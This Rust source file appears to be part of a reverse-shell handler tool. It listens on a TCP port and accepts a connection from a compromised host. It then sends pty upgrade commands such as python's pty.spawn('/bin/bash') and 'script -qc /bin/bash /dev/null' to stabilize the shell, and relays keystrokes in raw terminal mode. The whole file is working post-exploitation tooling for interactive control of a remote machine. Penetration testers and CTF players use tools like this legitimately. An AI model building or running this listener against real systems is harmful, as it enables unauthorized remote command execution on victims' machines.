use crate::args::Args;
use crossterm::terminal::{disable_raw_mode, enable_raw_mode};
use log::*;
use std::{
    io::{self, Read, Write},
    net::{TcpListener, TcpStream},
    process, thread,
};

const M: &str = "[-] ";
const P: &str = "[+] ";

fn try_stablalize(stream: &mut TcpStream) -> Option<()> {
    let mut stabalizers = [
        (
            b"python\n".to_vec(),
            b"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n".to_vec(),
        ),
        (
            b"python3\n".to_vec(),
            b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n".to_vec(),
        ),
        (
            b"script\n".to_vec(),
            b"script -qc /bin/bash /dev/null\n".to_vec(),
        ),
    ];
    for (util, command) in &mut stabalizers {
        println!(
            "{P}Trying to stabalize shell using {}",
            String::from_utf8_lossy(&util.strip_suffix(b"\n").unwrap())
        );
        let mut checker = b"which ".to_vec();
        checker.append(&mut util.clone());
        stream.write(&checker).expect("{M}Unable to write util!");

        let mut response_buffer = [0; 256];
        stream
            .read(&mut response_buffer)
            .expect("{M}Unable to read util response");
        let response = String::from_utf8_lossy(&response_buffer);
        if !(response.contains("no ") || response.contains("not")) {
            println!(
                "{P}Shell stabalized with \"{}\"!",
                String::from_utf8_lossy(&util.strip_suffix(b"\n").unwrap())
            );
            stream.write(command).expect("Unable to write command!");
            return Some(());
        } else {
            println!("{M}Shell stabalization failed!");
            continue;
        }
    }
    None
}

pub fn listen(args: Args) -> io::Result<()> {
    let addr = format!("0.0.0.0:{}", args.l);
    let listener = TcpListener::bind(addr.clone())?;
    println!("{P}Listener started on: {addr}");
    let (mut stream, remoteaddr) = listener.accept()?;
    println!("{P}Recieved connection from: {remoteaddr}");

    // stablalize shell
    try_stablalize(&mut stream).unwrap_or_else(|| {
        println!("{M}Unable to stablalize shell, bailing out!");
        process::exit(1);
    });

    // start raw mode
    enable_raw_mode().unwrap_or_else(|e| {
        error!("{M}Unable to start raw mode: {e}");
        process::exit(1);
    });

    // Start read/write
    let mut writer_stream = stream;
    let mut reader_stream = writer_stream.try_clone().unwrap_or_else(|e| {
        error!("{M}Error cloning writer stream: {e}");
        process::exit(1);
    });

    let reader_handle = thread::spawn(move || {
        // reader
        let mut stdout = std::io::stdout();
        loop {
            let mut buff = [0; 1024];
            reader_stream.read(&mut buff).unwrap_or_else(|e| {
                handle_stream_close(e);
                0
            });
            let mut crlfbuff = add_crlf(&mut buff);
            stdout
                .write_all(&mut crlfbuff)
                .expect("{M}Cannot Write to stdout!");
        }
    });
    let writer_handle = thread::spawn(move || {
        let mut buff = [0; 1];
        loop {
            std::io::stdin()
                .read(&mut buff)
                .expect("{M}Cannot read from stdin!");
            writer_stream.write(&mut buff).unwrap_or_else(|e| {
                handle_stream_close(e);
                0
            });
        }
    });
    writer_handle.join().unwrap();
    reader_handle.join().unwrap();
    Ok(())
}

fn add_crlf(buff: &[u8]) -> Vec<u8> {
    let mut vec_buf = Vec::new();
    for elem in buff {
        if *elem == 0x0a {
            vec_buf.push(0x0d);
        }
        vec_buf.push(*elem);
    }
    vec_buf
}

fn handle_stream_close(e: io::Error) {
    disable_raw_mode().unwrap_or_else(|e| {
        error!("{M}Unable to disable raw mode: {e}");
        process::exit(1)
    });
    println!("{M}Stream Closed: {e}");
    process::exit(1);
}
